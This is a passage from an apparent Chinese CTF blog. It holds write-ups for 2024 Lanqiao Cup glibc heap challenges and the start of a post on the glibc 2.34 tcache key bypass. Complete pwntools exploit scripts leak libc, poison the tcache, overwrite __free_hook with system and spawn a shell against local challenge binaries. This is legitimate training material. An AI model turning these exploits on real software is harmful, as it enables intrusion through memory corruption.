pwn import*</span><br><span class="line">from struct import pack</span><br><span class="line">import ctypes</span><br><span class="line">#from LibcSearcher import *</span><br><span class="line">from ae64 import AE64</span><br><span class="line">def bug():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">def s(a):</span><br><span class="line">p.send(a)</span><br><span class="line">def sa(a,b):</span><br><span class="line">p.sendafter(a,b)</span><br><span class="line">def sl(a):</span><br><span class="line">p.sendline(a)</span><br><span class="line">def sla(a,b):</span><br><span class="line">p.sendlineafter(a,b)</span><br><span class="line">def r(a):</span><br><span class="line">p.recv(a)</span><br><span class="line">#def pr(a):</span><br><span class="line">#print(p.recv(a))</span><br><span class="line">def rl(a):</span><br><span class="line">return p.recvuntil(a)</span><br><span class="line">def inter():</span><br><span class="line">p.interactive()</span><br><span class="line">def get_addr64():</span><br><span class="line">return u64(p.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">def get_addr32():</span><br><span class="line">return u32(p.recvuntil(&quot;\xf7&quot;)[-4:])</span><br><span class="line">def get_sb():</span><br><span class="line">return libc_base+libc.sym[&#x27;system&#x27;],libc_base+libc.search(b&quot;/bin/sh\x00&quot;).__next__()</span><br><span class="line">def get_hook():</span><br><span class="line">return libc_base+libc.sym[&#x27;__malloc_hook&#x27;],libc_base+libc.sym[&#x27;__free_hook&#x27;]</span><br><span class="line">li = lambda x : print(&#x27;\x1b[01;38;5;214m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line">ll = lambda x : print(&#x27;\x1b[01;38;5;1m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">#context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)   </span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">libc=ELF(&#x27;./libc-2.27.so&#x27;)   </span><br><span class="line">#libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6&#x27;) </span><br><span class="line">#libc=ELF(&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;)</span><br><span class="line">#libc=ELF(&#x27;libc-2.23.so&#x27;) </span><br><span class="line">#libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;)    </span><br><span class="line">#libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span><br><span class="line">elf=ELF(&#x27;./pwn&#x27;)</span><br><span class="line">#p=remote(&#x27;&#x27;,)</span><br><span class="line">p = process(&#x27;./pwn&#x27;)</span><br><span class="line">passwd = []</span><br><span class="line">rl(&quot;a simple classic question&quot;)</span><br><span class="line">elf1=ctypes.CDLL(&quot;./libc-2.27.so&quot;)</span><br><span class="line">elf1.srand(elf1.time(0))</span><br><span class="line">for i in range(7):</span><br><span class="line">    passwd.append(chr(elf1.rand() % 80 + 32))  # 转换为字符并加入列表</span><br><span class="line">string=&quot;&quot;.join(passwd)</span><br><span class="line">print(string)    </span><br><span class="line">rl(&quot;please login &gt;&gt;&gt;&gt;&quot;)</span><br><span class="line">payload=string</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add(idx,size):</span><br><span class="line">rl(&quot;:&quot;)</span><br><span class="line">sl(str(1))</span><br><span class="line">rl(&quot;Index: &quot;)</span><br><span class="line">sl(str(idx))</span><br><span class="line">rl(&quot;Size &quot;)</span><br><span class="line">sl(str(size))</span><br><span class="line"></span><br><span class="line">def edit(idx,c):</span><br><span class="line">rl(&quot;:&quot;)</span><br><span class="line">sl(str(2))</span><br><span class="line">rl(&quot;Index: &quot;)</span><br><span class="line">sl(str(idx))</span><br><span class="line">rl(&quot;Content: &quot;)</span><br><span class="line">s(c)</span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">rl(&quot;:&quot;)</span><br><span class="line">sl(str(3))</span><br><span class="line">rl(&quot;Index: &quot;)</span><br><span class="line">sl(str(idx))</span><br><span class="line"></span><br><span class="line">def free(idx):</span><br><span class="line">rl(&quot;:&quot;)</span><br><span class="line">sl(str(4))</span><br><span class="line">rl(&quot;Index: &quot;)</span><br><span class="line">sl(str(idx))</span><br><span class="line">for i in range(10):#0-9</span><br><span class="line">add(i,0xa8)</span><br><span class="line">for i in range(7):</span><br><span class="line">free(i)</span><br><span class="line">free(7)</span><br><span class="line">add(10,0x28)</span><br><span class="line">show(10)</span><br><span class="line">libc_base=get_addr64()-4111680</span><br><span class="line">li(hex(libc_base))</span><br><span class="line">malloc_hook,free_hook=get_hook()</span><br><span class="line">system,bin_sh=get_sb()</span><br><span class="line">add(11,0x78)</span><br><span class="line"></span><br><span class="line">add(12,0x18)</span><br><span class="line">add(13,0x68)</span><br><span class="line">add(14,0x68)</span><br><span class="line">add(15,0x68)</span><br><span class="line">add(16,0x18)</span><br><span class="line"></span><br><span class="line">edit(12,b&#x27;\x00&#x27;*0x18+p8(0xe1))</span><br><span class="line">free(13)</span><br><span class="line">add(17,0xd8)</span><br><span class="line">free(15)</span><br><span class="line">free(14)</span><br><span class="line">edit(17,b&#x27;\x00&#x27;*0x68+p64(0x71)+p64(free_hook)+b&#x27;\n&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(18,0x68)</span><br><span class="line">add(19,0x68)</span><br><span class="line">edit(18,b&#x27;/bin/sh\x00&#x27;+b&#x27;\n&#x27;)</span><br><span class="line">edit(19,p64(system)+b&#x27;\n&#x27;)</span><br><span class="line"></span><br><span class="line">#bug()</span><br><span class="line">free(18)</span><br><span class="line">inter()</span><br></pre></td></tr></table></figure><h4 id="第二题-2">第二题</h4><p>2.31堆</p><p>add,free,edit,show</p><p>存在uaf,add只能申请&lt;0x60的堆块</p><p>中间可以申请一次大堆块，正解应该是堆块错位后覆盖size，free大堆块进入unsortdbin，得到libc地址，之后tcachebin attack攻击free_hook</p><p>还可以攻击tcachebin的指针区，修改0x290的bins的counts为7，再将指针区作为堆块申请出来，free后进入unsortdbin，show得到libc地址，tcacheBin attack攻击free_hook</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1734604925326-076c5b5a-d81c-4e83-bf77-e7526db3a49e.png" alt=""></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from struct import pack</span><br><span class="line">import ctypes</span><br><span class="line">#from LibcSearcher import *</span><br><span class="line">from ae64 import AE64</span><br><span class="line">def bug():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">def s(a):</span><br><span class="line">p.send(a)</span><br><span class="line">def sa(a,b):</span><br><span class="line">p.sendafter(a,b)</span><br><span class="line">def sl(a):</span><br><span class="line">p.sendline(a)</span><br><span class="line">def sla(a,b):</span><br><span class="line">p.sendlineafter(a,b)</span><br><span class="line">def r(a):</span><br><span class="line">p.recv(a)</span><br><span class="line">#def pr(a):</span><br><span class="line">#print(p.recv(a))</span><br><span class="line">def rl(a):</span><br><span class="line">return p.recvuntil(a)</span><br><span class="line">def inter():</span><br><span class="line">p.interactive()</span><br><span class="line">def get_addr64():</span><br><span class="line">return u64(p.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">def get_addr32():</span><br><span class="line">return u32(p.recvuntil(&quot;\xf7&quot;)[-4:])</span><br><span class="line">def get_sb():</span><br><span class="line">return libc_base+libc.sym[&#x27;system&#x27;],libc_base+libc.search(b&quot;/bin/sh\x00&quot;).__next__()</span><br><span class="line">def get_hook():</span><br><span class="line">return libc_base+libc.sym[&#x27;__malloc_hook&#x27;],libc_base+libc.sym[&#x27;__free_hook&#x27;]</span><br><span class="line">li = lambda x : print(&#x27;\x1b[01;38;5;214m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line">ll = lambda x : print(&#x27;\x1b[01;38;5;1m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">#context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)   </span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.31-0ubuntu9.2_amd64/libc.so.6&#x27;)   </span><br><span class="line">#libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6&#x27;) </span><br><span class="line">#libc=ELF(&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;)</span><br><span class="line">#libc=ELF(&#x27;libc-2.23.so&#x27;) </span><br><span class="line">#libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;)    </span><br><span class="line">#libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span><br><span class="line">elf=ELF(&#x27;./pwn&#x27;)</span><br><span class="line">#p=remote(&#x27;&#x27;,)</span><br><span class="line">p = process(&#x27;./pwn&#x27;)</span><br><span class="line"></span><br><span class="line">def add(i,size):</span><br><span class="line">rl(&quot;&gt;&gt; &quot;)</span><br><span class="line">sl(str(1))</span><br><span class="line">rl(&quot;index: &quot;)</span><br><span class="line">sl(str(i))</span><br><span class="line">rl(&quot;size: &quot;)</span><br><span class="line">sl(str(size))</span><br><span class="line">def free(i):</span><br><span class="line">rl(&quot;&gt;&gt; &quot;)</span><br><span class="line">sl(str(2))</span><br><span class="line">rl(&quot;index: &quot;)</span><br><span class="line">sl(str(i))</span><br><span class="line">def show(i):</span><br><span class="line">rl(&quot;&gt;&gt; &quot;)</span><br><span class="line">sl(str(4))</span><br><span class="line">rl(&quot;index: &quot;)</span><br><span class="line">sl(str(i))</span><br><span class="line">def edit(i,content):</span><br><span class="line">rl(&quot;&gt;&gt; &quot;)</span><br><span class="line">sl(str(3))</span><br><span class="line">rl(&quot;index: &quot;)</span><br><span class="line">sl(str(i))</span><br><span class="line">rl(&quot;contents: &quot;)</span><br><span class="line">s(content)</span><br><span class="line"></span><br><span class="line">add(0,0x58)</span><br><span class="line">add(1,0x58)</span><br><span class="line">add(2,0x58)</span><br><span class="line">add(3,0x48)</span><br><span class="line">add(4,0x48)</span><br><span class="line">add(5,0x18)</span><br><span class="line"></span><br><span class="line">free(0)</span><br><span class="line">free(1)</span><br><span class="line">show(1)</span><br><span class="line">a=p.recv(6)</span><br><span class="line">heap_base=u64(p.recv(6).ljust(8,b&#x27;\x00&#x27;))-0x2a0</span><br><span class="line">li(hex(heap_base))</span><br><span class="line"></span><br><span class="line">edit(1,p64(heap_base+0x30)+b&#x27;\n&#x27;)</span><br><span class="line">add(6,0x58)</span><br><span class="line">add(7,0x58)</span><br><span class="line">edit(7,p64(0)*5+p64(0x7000000000000)+b&#x27;\n&#x27;)</span><br><span class="line"></span><br><span class="line">free(4)</span><br><span class="line">free(3)</span><br><span class="line">edit(3,p64(heap_base+0x10)+b&#x27;\n&#x27;)</span><br><span class="line">add(8,0x48)</span><br><span class="line">add(9,0x48)</span><br><span class="line">free(9)</span><br><span class="line">show(9)</span><br><span class="line">libc_base=get_addr64()-2014176</span><br><span class="line">li(hex(libc_base))</span><br><span class="line">system,bin_sh=get_sb()</span><br><span class="line">malloc_hook,free_hook=get_hook()</span><br><span class="line">edit(9,p64(0)*5+b&#x27;\n&#x27;)</span><br><span class="line">free(2)</span><br><span class="line">free(1)</span><br><span class="line"></span><br><span class="line">edit(1,p64(free_hook)+b&#x27;\n&#x27;)</span><br><span class="line">add(10,0x58)</span><br><span class="line">add(11,0x58)</span><br><span class="line">edit(10,b&#x27;/bin/sh\x00\n&#x27;)</span><br><span class="line">edit(11,p64(system)+b&#x27;\n&#x27;)</span><br><span class="line">bug()</span><br><span class="line"></span><br><span class="line">free(10)</span><br><span class="line"></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from struct import pack</span><br><span class="line">import ctypes</span><br><span class="line">#from LibcSearcher import *</span><br><span class="line">from ae64 import AE64</span><br><span class="line">def bug():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">def s(a):</span><br><span class="line">p.send(a)</span><br><span class="line">def sa(a,b):</span><br><span class="line">p.sendafter(a,b)</span><br><span class="line">def sl(a):</span><br><span class="line">p.sendline(a)</span><br><span class="line">def sla(a,b):</span><br><span class="line">p.sendlineafter(a,b)</span><br><span class="line">def r(a):</span><br><span class="line">p.recv(a)</span><br><span class="line">#def pr(a):</span><br><span class="line">#print(p.recv(a))</span><br><span class="line">def rl(a):</span><br><span class="line">return p.recvuntil(a)</span><br><span class="line">def inter():</span><br><span class="line">p.interactive()</span><br><span class="line">def get_addr64():</span><br><span class="line">return u64(p.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">def get_addr32():</span><br><span class="line">return u32(p.recvuntil(&quot;\xf7&quot;)[-4:])</span><br><span class="line">def get_sb():</span><br><span class="line">return libc_base+libc.sym[&#x27;system&#x27;],libc_base+libc.search(b&quot;/bin/sh\x00&quot;).__next__()</span><br><span class="line">def get_hook():</span><br><span class="line">return libc_base+libc.sym[&#x27;__malloc_hook&#x27;],libc_base+libc.sym[&#x27;__free_hook&#x27;]</span><br><span class="line">li = lambda x : print(&#x27;\x1b[01;38;5;214m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line">ll = lambda x : print(&#x27;\x1b[01;38;5;1m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">#context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)   </span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.31-0ubuntu9.2_amd64/libc.so.6&#x27;)   </span><br><span class="line">#libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6&#x27;) </span><br><span class="line">#libc=ELF(&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;)</span><br><span class="line">#libc=ELF(&#x27;libc-2.23.so&#x27;) </span><br><span class="line">#libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;)    </span><br><span class="line">#libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span><br><span class="line">elf=ELF(&#x27;./pwn&#x27;)</span><br><span class="line">#p=remote(&#x27;&#x27;,)</span><br><span class="line">p = process(&#x27;./pwn&#x27;)</span><br><span class="line"></span><br><span class="line">def add(i,size):</span><br><span class="line">rl(&quot;&gt;&gt; &quot;)</span><br><span class="line">sl(str(1))</span><br><span class="line">rl(&quot;index: &quot;)</span><br><span class="line">sl(str(i))</span><br><span class="line">rl(&quot;size: &quot;)</span><br><span class="line">sl(str(size))</span><br><span class="line">def free(i):</span><br><span class="line">rl(&quot;&gt;&gt; &quot;)</span><br><span class="line">sl(str(2))</span><br><span class="line">rl(&quot;index: &quot;)</span><br><span class="line">sl(str(i))</span><br><span class="line">def show(i):</span><br><span class="line">rl(&quot;&gt;&gt; &quot;)</span><br><span class="line">sl(str(4))</span><br><span class="line">rl(&quot;index: &quot;)</span><br><span class="line">sl(str(i))</span><br><span class="line">def edit(i,content):</span><br><span class="line">rl(&quot;&gt;&gt; &quot;)</span><br><span class="line">sl(str(3))</span><br><span class="line">rl(&quot;index: &quot;)</span><br><span class="line">sl(str(i))</span><br><span class="line">rl(&quot;contents: &quot;)</span><br><span class="line">s(content)</span><br><span class="line">def add2(size):</span><br><span class="line">rl(&quot;&gt;&gt; \n&quot;)</span><br><span class="line">sl(str(555))</span><br><span class="line">rl(&quot;find me\n&quot;)</span><br><span class="line">sl(str(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(0,0x60)</span><br><span class="line">add(1,0x60)</span><br><span class="line">add2(0x400)</span><br><span class="line">add(2,0x60)</span><br><span class="line"></span><br><span class="line">free(1)</span><br><span class="line">free(0)</span><br><span class="line">bug()</span><br><span class="line">edit(0,b&#x27;\n&#x27;)</span><br><span class="line">add(3,0x60)</span><br><span class="line">add(4,0x60)</span><br><span class="line">edit(4,p64(0)+p64(0x481)+b&#x27;\n&#x27;)</span><br><span class="line">free(1)</span><br><span class="line">show(1)</span><br><span class="line">libc_base=get_addr64()-2014176</span><br><span class="line">li(hex(libc_base))</span><br><span class="line">system,bin_sh=get_sb()</span><br><span class="line">malloc_hook,free_hook=get_hook()</span><br><span class="line"></span><br><span class="line">add(5,0x60)</span><br><span class="line">free(5)</span><br><span class="line">free(2)</span><br><span class="line"></span><br><span class="line">edit(2,p64(free_hook)+b&#x27;\n&#x27;)</span><br><span class="line">add(6,0x60)</span><br><span class="line">add(7,0x60)</span><br><span class="line">edit(6,b&#x27;/bin/sh\x00\n&#x27;)</span><br><span class="line">edit(7,p64(system)+b&#x27;\n&#x27;)</span><br><span class="line">bug()</span><br><span class="line"></span><br><span class="line">free(6)</span><br><span class="line"></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure><h1></h1>]]></content>
    
    
    <summary type="html">2024蓝桥杯</summary>
    
    
    
    <category term="Writeup" scheme="https://www.thir0th.xyz/categories/Writeup/"/>
    
    
    <category term="CTF" scheme="https://www.thir0th.xyz/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>2.34的key异或绕过</title>
    <link href="https://www.thir0th.xyz/posts/f484160.html"/>
    <id>https://www.thir0th.xyz/posts/f484160.html</id>
    <published>2025-04-19T16:28:22.000Z</published>
    <updated>2025-05-07T08:10:47.973Z</updated>
    
    <content type="html"><![CDATA[<h1>2.34的key异或绕过</h1><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1731408768499-51dea875-b6af-410f-84b3-cd651d6913ec.png" alt=""></p><p>2.34引入</p><p>当tcachebin中</p><p>只有一个堆块的时候，key在堆块的fd位</p><p>如果有多个的话，key在tcachebin尾堆块的fd位，因为之前的fd会被加密，因为tcachebin堆指针异或加密</p><h3 id="font-style-color-rgb-51-51-51-tcache-key-校验机制-font"><font style="color:rgb(51, 51, 51);">tcache key 校验机制</font></h3><p><font style="color:rgb(51, 51, 51);">此处以libc-2.29源码文件malloc.c来进行机制介绍</font></p><p><font style="color:rgb(51, 51, 51);">tcache的分配位于__libc_malloc函数，相关代码：</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#if USE_TCACHE</span><br><span class="line">  /* int_free also calls request2size, be careful to not pad twice.  */</span><br><span class="line">  size_t tbytes;</span><br><span class="line">  checked_request2size (bytes, tbytes);</span><br><span class="line">  size_t tc_idx = csize2tidx (tbytes);</span><br><span class="line"></span><br><span class="line">  MAYBE_INIT_TCACHE ();</span><br><span class="line"></span><br><span class="line">  DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="line">  if (tc_idx &lt; mp_.tcache_bins</span><br><span class="line">      /*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/ /* to appease gcc */</span><br><span class="line">      &amp;&amp; tcache</span><br><span class="line">      &amp;&amp; tcache-&gt;entries[tc_idx] != NULL)</span><br><span class="line">    &#123;</span><br><span class="line">      return tcache_get (tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">  DIAG_POP_NEEDS_COMMENT;</span><br><span class="line">#endif</span><br></pre></td></tr></table></figure><p><font style="color:rgb(51, 51, 51);">此处tbytes是请求的chunk大小，tc_idx是对应保存tcache链表数组的索引，申请操作中进行了一个检查：检查目标链表是不是空的，不是空的就分配</font></p><p><font style="color:rgb(51, 51, 51);">tcache的释放位于_int_free函数，相关代码：</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">#if USE_TCACHE</span><br><span class="line">  &#123;</span><br><span class="line">    size_t tc_idx = csize2tidx (size);</span><br><span class="line">    if (tcache != NULL &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">      &#123;</span><br><span class="line">    /* Check to see if it&#x27;s already in the tcache.  */</span><br><span class="line">    tcache_entry *e = (tcache_entry *) chunk2mem (p);</span><br><span class="line"></span><br><span class="line">    /* This test succeeds on double free.  However, we don&#x27;t 100%</span><br><span class="line">       trust it (it also matches random payload data at a 1 in</span><br><span class="line">       2^&lt;size_t&gt; chance), so verify it&#x27;s not an unlikely</span><br><span class="line">       coincidence before aborting.  */</span><br><span class="line">    if (__glibc_unlikely (e-&gt;key == tcache))</span><br><span class="line">      &#123;</span><br><span class="line">        tcache_entry *tmp;</span><br><span class="line">        LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx);</span><br><span class="line">        for (tmp = tcache-&gt;entries[tc_idx];</span><br><span class="line">         tmp;</span><br><span class="line">         tmp = tmp-&gt;next)</span><br><span class="line">          if (tmp == e)</span><br><span class="line">        malloc_printerr (&quot;free(): double free detected in tcache 2&quot;);</span><br><span class="line">        /* If we get here, it was a coincidence.  We&#x27;ve wasted a</span><br><span class="line">           few cycles, but don&#x27;t abort.  */</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    if (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">      &#123;</span><br><span class="line">        tcache_put (p, tc_idx);</span><br><span class="line">        return;</span><br><span class="line">      &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">#endif</span><br></pre></td></tr></table></figure><p><font style="color:rgb(51, 51, 51);">先判断e-&gt;key是不是tcache，是的话，就进入一个循环，遍历该chunk所在链表所有的chunk判断是否与释放的chunk地址一致，一致则相同</font></p><p><font style="color:rgb(51, 51, 51);">关于e-&gt;key为什么会是tcache，在tcache_put函数中有体现：</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">/* Caller must ensure that we know tc_idx is valid and there&#x27;s room</span><br><span class="line">   for more chunks.  */</span><br><span class="line">static __always_inline void</span><br><span class="line">tcache_put (mchunkptr chunk, size_t tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line"></span><br><span class="line">  /* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span><br><span class="line">     detect a double free.  */</span><br><span class="line">  e-&gt;key = tcache;</span><br><span class="line"></span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><font style="color:rgb(51, 51, 51);">该版本中，释放的chunk会将tcache写入key字段中，然后就是链表头插节点，数量加一</font></p><h3 